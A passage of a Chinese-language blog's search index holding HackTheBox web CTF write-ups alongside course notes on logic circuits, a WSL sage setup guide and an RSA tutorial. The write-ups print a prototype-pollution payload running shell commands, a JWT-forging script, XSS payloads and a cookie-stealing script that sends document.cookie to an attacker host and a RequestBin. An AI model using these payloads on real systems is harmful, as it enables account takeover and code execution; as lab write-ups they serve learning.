例题","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"GBS 操作系统","slug":"TUM课程笔记/GBS-操作系统","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/GBS-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Betriebssysteme","slug":"Betriebssysteme","permalink":"https://archer-baiyi.github.io/tags/Betriebssysteme/"},{"name":"Operating System","slug":"Operating-System","permalink":"https://archer-baiyi.github.io/tags/Operating-System/"},{"name":"操作系统","slug":"操作系统","permalink":"https://archer-baiyi.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"内存管理","slug":"内存管理","permalink":"https://archer-baiyi.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"name":"Paging","slug":"Paging","permalink":"https://archer-baiyi.github.io/tags/Paging/"},{"name":"Page table","slug":"Page-table","permalink":"https://archer-baiyi.github.io/tags/Page-table/"},{"name":"Ersetztungsstrategie","slug":"Ersetztungsstrategie","permalink":"https://archer-baiyi.github.io/tags/Ersetztungsstrategie/"}]},{"title":"HTB Gunship Writeup","slug":"CTF/Web/HTB-Gunship-Writeup","date":"2025-04-02T18:13:43.000Z","updated":"2025-04-02T21:31:57.706Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Gunship-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Gunship-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 查看源码： 12345678910111213141516171819202122232425const path = require(&#x27;path&#x27;);const express = require(&#x27;express&#x27;);const pug = require(&#x27;pug&#x27;);const &#123; unflatten &#125; = require(&#x27;flat&#x27;);const router = express.Router();router.get(&#x27;/&#x27;, (req, res) =&gt; &#123; return res.sendFile(path.resolve(&#x27;views/index.html&#x27;));&#125;);router.post(&#x27;/api/submit&#x27;, (req, res) =&gt; &#123; const &#123; artist &#125; = unflatten(req.body); if (artist.name.includes(&#x27;Haigh&#x27;) || artist.name.includes(&#x27;Westaway&#x27;) || artist.name.includes(&#x27;Gingell&#x27;)) &#123; return res.json(&#123; &#x27;response&#x27;: pug.compile(&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;)(&#123; user: &#x27;guest&#x27; &#125;) &#125;); &#125; else &#123; return res.json(&#123; &#x27;response&#x27;: &#x27;Please provide us with the full name of an existing member.&#x27; &#125;); &#125;&#125;);module.exports = router; 发现它使用了 pug 模板引擎，是专门用来生成 HTML的。 使用Burpsuit抓包可以发现网页给 /api/submit 发送的是： 渗透这段代码里一开始引用的 unflatten() 正是漏洞所在。 （具体攻击原理参考 https://rayepeng.medium.com/how-ast-injection-and-prototype-pollution-ignite-threats-abb165164a68） 将发送的内容改成（放到Repeater里修改了再发送）： 123456789&#123; &quot;artist.name&quot;: &quot;Haigh&quot;, &quot;__proto__&quot;: &#123; &quot;block&quot;: &#123; &quot;type&quot;: &quot;Text&quot;, &quot;line&quot;: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这个内容经过 unflatten() 的处理后会变成： 123456789&#123; artist: &#123; name: &quot;Haigh&quot; &#125;, __proto__: &#123; block: &#123; type: &quot;Text&quot;, line: &quot;console.log(process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cp /app/flag* /app/static/flag&#x27;).toString())&quot; &#125; &#125;&#125; 这里的__proto__ 会污染 所有对象的原型，让所有对象都拥有 .block 这个属性。 这段代码最终干的事情便是： 1cp /app/flag* /app/static/flag 会将flag的内容复制到 /app/static/flag 目录下，然后我们直接访问 1http://83.136.249.227:44133/static/flag 便可下载文件然后得到flag：HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"RCE","slug":"RCE","permalink":"https://archer-baiyi.github.io/tags/RCE/"}]},{"title":"HTB WayWitch Writeup","slug":"CTF/Web/HTB-WayWitch-Writeup","date":"2025-04-02T16:03:54.000Z","updated":"2025-04-02T21:32:28.368Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-WayWitch-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 输入123试试，然后查看cookie： 因为cookie的内容为3部分，每2部分由 . 隔开的，所以是JWT，用 https://jwt.io/ 试试： 去给的附件里找找看有没有关于JWT的信息。 运气比较好，通过直接搜索 “JWT” 可以在 scr/views/index.html 里找到这部分内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061async function generateJWT() &#123; const existingToken = getCookie(&quot;session_token&quot;); if (existingToken) &#123; console.log(&quot;Session token already exists:&quot;, existingToken); return; &#125; const randomNumber = Math.floor(Math.random() * 10000); const guestUsername = &quot;guest_&quot; + randomNumber; const header = &#123; alg: &quot;HS256&quot;, typ: &quot;JWT&quot;, &#125;; const payload = &#123; username: guestUsername, iat: Math.floor(Date.now() / 1000), &#125;; const secretKey = await crypto.subtle.importKey( &quot;raw&quot;, new TextEncoder().encode(&quot;halloween-secret&quot;), &#123; name: &quot;HMAC&quot;, hash: &quot;SHA-256&quot; &#125;, false, [&quot;sign&quot;], ); const headerBase64 = btoa(JSON.stringify(header)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const payloadBase64 = btoa(JSON.stringify(payload)) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const dataToSign = `$&#123;headerBase64&#125;.$&#123;payloadBase64&#125;`; const signatureArrayBuffer = await crypto.subtle.sign( &#123; name: &quot;HMAC&quot; &#125;, secretKey, new TextEncoder().encode(dataToSign), ); const signatureBase64 = btoa( String.fromCharCode.apply( null, new Uint8Array(signatureArrayBuffer), ), ) .replace(/\\+/g, &quot;-&quot;) .replace(/\\//g, &quot;_&quot;) .replace(/=+$/, &quot;&quot;); const token = `$&#123;dataToSign&#125;.$&#123;signatureBase64&#125;`; document.cookie = `session_token=$&#123;token&#125;; path=/; max-age=$&#123;60 * 60 * 24&#125;; Secure`; console.log(&quot;Generated JWT Session Token:&quot;, token); &#125; 可以发现这里是把 halloween-secret 作为密钥进行签名的。继续阅读源码，可以在 scr/routes/index.js 里发现： 12345678910111213141516171819202122232425262728router.get(&quot;/tickets&quot;, async (req, res) =&gt; &#123; const sessionToken = req.cookies.session_token; if (!sessionToken) &#123; return res.status(401).json(response(&quot;No session token provided&quot;)); &#125; try &#123; const username = getUsernameFromToken(sessionToken); if (username === &quot;admin&quot;) &#123; try &#123; const tickets = await db.get_tickets(); return res.status(200).json(&#123; tickets &#125;); &#125; catch (err) &#123; return res .status(500) .json(response(&quot;Error fetching tickets: &quot; + err.message)); &#125; &#125; else &#123; return res .status(403) .json(response(&quot;Access denied. Admin privileges required.&quot;)); &#125; &#125; catch (err) &#123; return res.status(400).json(response(err.message)); &#125;&#125;); 也就是说 /tickets 页面只会验证我们的username是否等于admin。 并且flag就在这个页面里，因为对应的database的内容为： 1234567891011121314151617181920212223242526async migrate() &#123; let flag; fs.readFile(&quot;/flag.txt&quot;, &quot;utf8&quot;, function (err, data) &#123; flag = data; &#125;); await this.db.exec(` DROP TABLE IF EXISTS tickets; CREATE TABLE tickets( id INTEGER PRIMARY KEY AUTOINCREMENT, name VARCHAR(255) NOT NULL, username VARCHAR(255) NOT NULL, content TEXT NOT NULL ); `); await this.db.exec(` INSERT INTO tickets (name, username, content) VALUES (&#x27;John Doe&#x27;, &#x27;guest_1234&#x27;, &#x27;I need help with my account.&#x27;), (&#x27;Jane Smith&#x27;, &#x27;guest_5678&#x27;, &#x27;There is an issue with my subscription.&#x27;), (&#x27;Admin&#x27;, &#x27;admin&#x27;, &#x27;Top secret: The Halloween party is at the haunted mansion this year. Use this code to enter $&#123;flag&#125;&#x27;), (&#x27;Paul Blake&#x27;, &#x27;guest_9012&#x27;, &#x27;Can someone assist with resetting my password?&#x27;), (&#x27;Alice Cooper&#x27;, &#x27;guest_3456&#x27;, &#x27;The app crashes every time I try to upload a picture.&#x27;); `); &#125; 渗透首先确认一下这个密钥是否正确： 然后将username的值改为”admin”，再利用这个新的JWT访问 /tickets 。 这个网站不知道为什么突然不能修改jwt了，所以写段python手动修改： 1234567891011121314import jwtoriginal_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0XzE3ODgiLCJpYXQiOjE3NDM2MDk3MDd9.RrHUnCE8lcYjM0m2LZQDYM46uqrberxslMW_FNtm49s&quot;secret = &quot;halloween-secret&quot;algorithm = &quot;HS256&quot;decoded_payload = jwt.decode(original_token, secret, algorithms=[algorithm])decoded_payload[&quot;username&quot;] = &quot;admin&quot;new_token = jwt.encode(decoded_payload, secret, algorithm=algorithm)print(&quot;\\n新的 Token:&quot;)print(new_token) 得到flag：HTB{k33p_th3s3_jwt_s3cr3t_s4f3f_br0} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"JWT","slug":"JWT","permalink":"https://archer-baiyi.github.io/tags/JWT/"}]},{"title":"HTB Phantom Script Writeup","slug":"CTF/Web/HTB-Phantom-Script-Writeup","date":"2025-04-02T11:56:01.000Z","updated":"2025-04-02T21:32:11.467Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-Phantom-Script-Writeup/","excerpt":"","text":"题目描述 （有附件，但完全不需要。） 观察打开网页： 注意右边的这段代码： 123456789101112searchInput.addEventListener(&#x27;input&#x27;, function () &#123; const query = searchInput.value; if (query.trim() !== &quot;&quot;) &#123; const filteredArticles = filterArticles(query); searchResultsHeading.innerHTML = `Results for: &quot;$&#123;query&#125;&quot;`; searchResultsHeading.style.display = &#x27;block&#x27;; renderArticles(filteredArticles); &#125; else &#123; searchResultsHeading.style.display = &#x27;none&#x27;; renderArticles(articles); &#125;&#125;); 这里会直接提取我们的输入赋值给 query，并且将query直接拼接进HTML的代码里了。 网页右下角那里还给了些基础xss的例子： 但是尝试 1&lt;script&gt;alert(&#x27;Boo!&#x27;);&lt;/script&gt; 会失败，有可能是那里自动过滤了。 渗透尝试其他Payload即可： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 检测到注入成功了便会自动显示flag。 得到flag：HTB{xS5_iS_34SY_wh4t_d0_you_th1nk?} 。 讲一下这里注入成功的原理： 这是我们注入的内容： 1&lt;img src=x onerror=&quot;alert(&#x27;Boo!&#x27;)&quot;&gt; 当我们在html里写 1&lt;img src=&quot;valid_image.jpg&quot;&gt; 的时候浏览器会自动去加载图片。但是我们这里故意写了个无效的地址1&lt;img src=x&gt; 所以加载时会触发error，然后 onerror 里的内容会被当作 JavaScript 执行。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB OnlyHacks Writeup","slug":"CTF/Web/HTB-OnlyHacks-Writeup","date":"2025-04-02T07:38:35.000Z","updated":"2025-04-02T21:32:07.040Z","comments":true,"path":"2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","permalink":"https://archer-baiyi.github.io/2025/04/02/CTF/Web/HTB-OnlyHacks-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 注册个账号试试：（注意这里一定要上传一个头像，不然会一直提示用户名重复） 进去之后会显示4个人，我们每个都点一下绿色的心（在dating app里应该是心动的意思）： 然后点进右上角的Mathces： 会发现只有一个对话框。 对话里没有什么有用的信息，但是我们注意到它好像是每隔一段时间（大概5到10秒左右）才会看一次我们的消息并回复，跟一般XSS的环境很像。 我们查看当前的cookie会发现： 通过base64解码会发现这个应该是通过cookie识别我们登录的身份的。（后面的乱码部分是python的flask的session自带的签名） 渗透通过XSS获取管理员身份并登录他的账号。 首先在 https://requestbin.kanbanbox.com/ 上创建一个RequestBin： 正常XSS攻击的模板是： 1&lt;script&gt;fetch(&quot;http://attacker.com?cookie=&quot; + document.cookie); &lt;/script&gt; 所以我们将我们在RequestBin创建的url放进去然后在聊天框发送： 1&lt;script&gt;fetch(&quot;https://requestbin.kanbanbox.com/xckrydxc?cookie=&quot; + document.cookie); &lt;/script&gt; 之后在RequestBin页面点击右上角的青色图标那里： 就可以查看收到的cookie内容： 1eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6IlJlbmF0YSJ9fQ.Z-0WhA.5nThwcWkf-HP8ql-gF68E3RTUjE 之后在浏览器里修改我们的cookie再刷新网页： 可以看到我们成功登录了她的账号，还能看到我们刚才发送的消息。 flag就在另一个对话里：HTB{d0nt_trust_str4ng3r5_bl1ndly} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"XSS","slug":"XSS","permalink":"https://archer-baiyi.github.io/tags/XSS/"}]},{"title":"逻辑电路图","slug":"TUM笔记/ERA/逻辑电路图","date":"2025-03-31T20:35:54.000Z","updated":"2025-04-01T17:48:45.056Z","comments":true,"path":"2025/03/31/TUM笔记/ERA/逻辑电路图/","permalink":"https://archer-baiyi.github.io/2025/03/31/TUM%E7%AC%94%E8%AE%B0/ERA/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/","excerpt":"","text":"逻辑门先来认识（记）一下基础的逻辑门： 注意，NAND，NOR那里的那个小圆圈代表的是取反（negation），跟最底下的Negation是一个效果。 比如这里表达的是 $y = \\neg (a \\wedge \\neg b) $ ： 一般情况下堵在逻辑门出入口的圆圈指的是取反，而下面这种只是表示线路连接而已： 不要弄混了。 加法（Addition）半加器（Der Halbaddierer ，HA）半加器的目的是计算2个bit的加法，输出也为2个bit，即： 1234 a0+ b0------s1 s0 也可以用数学公式表达： \\begin{align*} ha: B^2 &\\to B^2 \\\\ (a_0,b_0) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0 \\end{align*}对应的真值表则是： \\begin{array}{cc|cc} a_0 & b_0 & s_1 & s_0 \\\\ \\hline 0 & 0 & 0 & 0 \\\\ 0 & 1 & 0 & 1 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 1 & 0 \\\\ \\end{array}也就是说 s_0 = a_0 \\text{ xor } b_0\\\\ s_1 = a_0 \\wedge b_0对应的逻辑电路图： 左边是and，右边是xor。在之后的内容里用HA指代半加器。 Kosten和Tiefe分别是：C(HA) = 2, Depth(HA) = 1。 全加器（Der Volladdierer ，FA）全加器的目的是计算3个bit的加法，输出为2个bit，即： 12345 a0+ b0+ c------s1 s0 其中c是进位信息。 对应的数学表达： \\begin{align*} fa: B^3 &\\to B^2 \\\\ (a_0,b_0,c) &\\mapsto (s_1,s_0)\\\\ \\text{mit } 2s_1+s_0 &= a_0+b_0+c \\end{align*}真值表： \\begin{array}{ccc|cc} a_0 & b_0 & c & fa_1 & fa_0 \\\\ \\hline 0 & 0 & 0 & 0 & 0 \\\\ 0 & 0 & 1 & 0 & 1 \\\\ 0 & 1 & 0 & 0 & 1 \\\\ 0 & 1 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 0 & 1 \\\\ 1 & 0 & 1 & 1 & 0 \\\\ 1 & 1 & 0 & 1 & 0 \\\\ 1 & 1 & 1 & 1 & 1 \\\\ \\end{array}注意到： s_0 = a_0 \\text{ xor } b_0 \\text{ xor } c = a_0(c,ha_0(a_0,b_0))\\\\ \\begin{align*} s_1 &= a_0 \\wedge b_0 \\vee c \\wedge (a_0 \\text{ xor } b_0 )\\\\ &= ha_1(a_0,b_0) + ha_1(c,ha_0(a_0,b_0)) \\end{align*}（ha0表示2个数相加得到的s0位的值，ha1同理。） 逻辑电路图： Kosten和Tiefe分别是：C(HA) = 5, Depth(HA) = 3。 选择器（Multiplexer，MUX）选择器正如字面意思，会从2个数里选择一个数。数学表达： \\begin{align*}sel_n: B^{2n+} &\\to B^{n} \\\\ (a_{n-1}, \\ldots, a_0, b_{n-1}, \\ldots, b_0, s) &\\mapsto \\begin{cases} (a_{n-1} \\ldots a_0), & \\text{falls } s = 1 \\\\ (b_{n-1} \\ldots b_0), & \\text{falls } s = 0 \\end{cases} \\end{align*}注意到： (sel_n)_i = (s \\wedge a_i) \\vee (\\neg s \\wedge b_i)逻辑电路图： 后续一般用这个符号指代： 存储（Speichern）RS-Latch 真值表： \\begin{array}{cc|cc} R & S & Q(t) & \\neg Q(t) \\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) \\\\ 0 & 1 & 1 & 0 \\\\ 1 & 0 & 0 & 1 \\\\ 1 & 1 & 0 & 0 \\\\ \\end{array}D-Latch （设上面 and 的结果为S，下面 and 的结果为R，跟RS-Latch的位置一样。） 真值表： \\begin{array}{cc|cc|cc} D & E & Q(t) & \\neg Q(t) & R & S\\\\ \\hline 0 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 0 & 1 & 0 & 1 & 1 & 0\\\\ 1 & 0 & Q(t) & \\neg Q(t) & 0 & 0\\\\ 1 & 1 & 1 & 0 & 0 & 1\\\\ \\end{array}2*2 Bit Speicher （write位等于0代表读，等于1代表写；灰色的是选择器；上面的2个黄色部分是Adresse=0的结果，下面的是Adresse=1的。） Inkrementer自增器主要用于比如说更新程序计数器（Program counter），需要到达的效果类似： 1add pc, pc, 4 需要2个步骤，计算加法并且存储结果。所以对应的逻辑电路为：","categories":[{"name":"TUM课程笔记","slug":"TUM课程笔记","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"ERA 计算机体系结构","slug":"TUM课程笔记/ERA-计算机体系结构","permalink":"https://archer-baiyi.github.io/categories/TUM%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/ERA-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"}],"tags":[{"name":"Rechnerarchitektur","slug":"Rechnerarchitektur","permalink":"https://archer-baiyi.github.io/tags/Rechnerarchitektur/"},{"name":"计算机体系结构","slug":"计算机体系结构","permalink":"https://archer-baiyi.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"},{"name":"逻辑电路图","slug":"逻辑电路图","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE/"},{"name":"逻辑门","slug":"逻辑门","permalink":"https://archer-baiyi.github.io/tags/%E9%80%BB%E8%BE%91%E9%97%A8/"}]},{"title":"如何在wsl里安装sage","slug":"CTF/如何在wsl里安装sage","date":"2025-03-31T12:44:34.000Z","updated":"2025-04-01T22:01:41.291Z","comments":true,"path":"2025/03/31/CTF/如何在wsl里安装sage/","permalink":"https://archer-baiyi.github.io/2025/03/31/CTF/%E5%A6%82%E4%BD%95%E5%9C%A8wsl%E9%87%8C%E5%AE%89%E8%A3%85sage/","excerpt":"","text":"一共分成2个步骤： 安装Miniforge（Anaconda的轻量化替代品） 通过Anaconda安装sage 下载vscode的wsl版（可选） 安装Miniforge1wget https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-Linux-x86_64.sh 然后安装脚本： 1bash Miniforge3-Linux-x86_64.sh 如果安装时询问你是否要把它加入 .bashrc， 选择是，这样一来每次打开wsl它都会自动启动并进入base环境，会比较方便。 当然如果这个自启没有设置成功，也可以手动设置： 先打开 .bashrc 编辑器 1nano ~/.bashrc 在文件末尾添加： 12. &quot;$HOME/miniforge3/etc/profile.d/conda.sh&quot;conda activate base 然后使用 Ctrl + o 和 Ctrl + x 保存并退出。 最后再运行： 1source ~/.bashrc 安装sage通过 1conda create -n sage sage -c conda-forge 安装sage。然后每次使用 1conda activate sage 激活sage环境并用 1sage 打开sage。 下载vscode的wsl版由于单纯用命令行运行sage代码不太方便，并且只用sage的话有些python的命令（比如说连接服务器等）容易出问题，可以安装一个vscode的wsl版。 首先在Windows里的vscode下载 wsl 的插件 之后在当前wsl的命令行里输入： 12code .# 用vscode打开当前文件夹 它便会开始自动下载wsl版的vscode。 下载完成后，每次启动wsl之后只需要先打开vscode： 1code . 然后在vscode的命令行里输入： 1conda activate sage 便可以编写并运行import了sage库的python代码。 记住要先开vscode再开启sage的环境，不然先开启了sage环境后，进到vscode里会掉回base的环境！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"}],"tags":[{"name":"wsl","slug":"wsl","permalink":"https://archer-baiyi.github.io/tags/wsl/"},{"name":"sage","slug":"sage","permalink":"https://archer-baiyi.github.io/tags/sage/"},{"name":"vscode","slug":"vscode","permalink":"https://archer-baiyi.github.io/tags/vscode/"}]},{"title":"HTB Full Stack Conf Writeup","slug":"CTF/Web/HTB-Full-Stack-Conf-Writeup","date":"2025-03-30T10:40:40.000Z","updated":"2025-04-02T21:31:39.305Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-Full-Stack-Conf-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 渗透因为提示用alert，并且题目描述里提到了JavaScript，所以直接尝试最简单的JavaScript注入： 1&lt;script&gt;alert(&#x27;1&#x27;);&lt;/script&gt; 得到flag：HTB{p0p..p0p..p0p...alert(1337)} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"注入","slug":"注入","permalink":"https://archer-baiyi.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://archer-baiyi.github.io/tags/JavaScript/"}]},{"title":"HTB baby auth Writeup","slug":"CTF/Web/HTB-baby-auth-Writeup","date":"2025-03-30T10:24:26.000Z","updated":"2025-04-02T21:31:50.592Z","comments":true,"path":"2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/30/CTF/Web/HTB-baby-auth-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站： 注册个账号然后登录试试： 查看当前cookie： 这段内容base64解码可以得到： 123eyJ1c2VybmFtZSI6IjEyMyJ9&#123;&quot;username&quot;:&quot;123&quot;&#125; 渗透将cookie改成 1&#123;&quot;username&quot;:&quot;admin&quot;&#125; 的base64，即 1eyJ1c2VybmFtZSI6ImFkbWluIn0= 修改cookie然后刷新网页： 得到flag：HTB{s3ss10n_1nt3grity_1s_0v3r4tt3d_4nyw4ys} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Cookie","slug":"Cookie","permalink":"https://archer-baiyi.github.io/tags/Cookie/"}]},{"title":"RSA加解密以及破解方法","slug":"CTF/Crypto/RSA加解密以及破解方法","date":"2025-03-29T19:01:56.000Z","updated":"2025-03-29T20:39:16.023Z","comments":true,"path":"2025/03/29/CTF/Crypto/RSA加解密以及破解方法/","permalink":"https://archer-baiyi.github.io/2025/03/29/CTF/Crypto/RSA%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%BB%A5%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95/","excerpt":"","text":"RSA加/解密首先设 \\varphi(m) := | \\{ 1 \\leq k \\leq m ｜\\gcd(k, m) = 1 \\} |为欧拉函数（Euler’sche Phi-function）。 RSA加密算法的初始化流程如下： 选择2个很大的质数$p, q$. 计算$n:=pq$。这里的n是公开的，$p, q$则是保密的。 计算$\\varphi(n)$。（因为我们知道$n=pq$，且$p, q$均为质数，我们可以利用公式$\\varphi(n)=(p-1)(q-1)$进行快速计算。） 选择$e \\in \\{1,2,…,\\varphi(n)-1\\}$，使得$gcd(\\varphi(n),e)=1$. 我们的公钥为$(e,n)$。 计算密钥$d$，满足$ed \\equiv 1$ mod $\\varphi(n)$. 公钥：$n, e$ 私钥：$d$ 假设明文内容为$c$，加密： b=a^e \\text{ mod } n, \\ \\ \\ \\ a,b \\in \\mathbb{Z}_n.解密： a=b^d \\text{ mod } n.如此一来，任何人都可以将一段信息加密后发送给我们，而只有我们能够解密这段信息。 在进行第5步计算密钥$d$时，可以考虑以下算法： 用扩展欧几里得算法找到 $x$ 和 $y$，使得： e \\cdot x + \\varphi(n) \\cdot y = 1, 上式中，$x$ 模 $\\varphi(n)$ 的值即为 $d$： d \\equiv x \\bmod \\varphi(n).如果 $d &lt; 0$，需要将其调整到正数范围： d = d + \\phi(n). 代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes # 将string转换成大整数from math import gcddef modinv(e, phi): # 扩展欧几里得算法计算模逆 def extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y) x, _ = extended_gcd(e, phi) return x % phip = getPrime(512) # 512位的素数q = getPrime(512) # 512位的素数n = p * qphi = (p - 1) * (q - 1)e = 65537 # 大部分默认使用这个e的值assert gcd(e, phi) == 1d = modinv(e, phi)# 加密def encrypt(message, e, n): m = bytes_to_long(message.encode()) c = pow(m, e, n) return c# 解密def decrypt(cipher_int, d, n): m = pow(cipher_int, d, n) message = long_to_bytes(m).decode() return messagemsg = &quot;Hello World!&quot;cipher = encrypt(msg, e, n)decrypted = decrypt(cipher, d, n) 攻击质因数分解nFermat’s Factorization这种方法适用于p和q的大小差不多的情况。 Pollard’s p-1Wiener’s Attack这种方法适用于d特别小的情况。（当给的e非常大的时候都可以试一下这种方法）","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/tags/Hash/"}]},{"title":"HTB Art 